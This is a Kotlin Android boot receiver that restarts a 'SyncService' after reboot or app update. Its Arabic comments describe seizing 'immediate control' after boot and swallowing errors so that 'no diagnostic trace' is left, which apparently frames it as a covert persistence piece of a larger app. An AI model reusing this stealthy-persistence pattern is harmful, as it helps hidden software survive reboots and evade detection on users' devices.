// =========================================================================
// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Supreme Boot Receiver v8.0
// الاستيقاظ الإجباري والسيطرة الفورية بعد إعادة إقلاع النظام
// =========================================================================
package com.uranium.fist

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        val action = intent?.action
        if (action == Intent.ACTION_BOOT_COMPLETED ||
            action == "android.intent.action.QUICKBOOT_POWERON" ||
            action == "android.intent.action.REBOOT" ||
            action == Intent.ACTION_MY_PACKAGE_REPLACED) {
            try {
                context?.let { ctx ->
                    val serviceIntent = Intent(ctx, SyncService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(serviceIntent)
                    } else {
                        ctx.startService(serviceIntent)
                    }
                }
            } catch (e: Exception) {
                // صمت تام لضمان عدم ترك أي أثر تشخيصي
            }
        }
    }
}
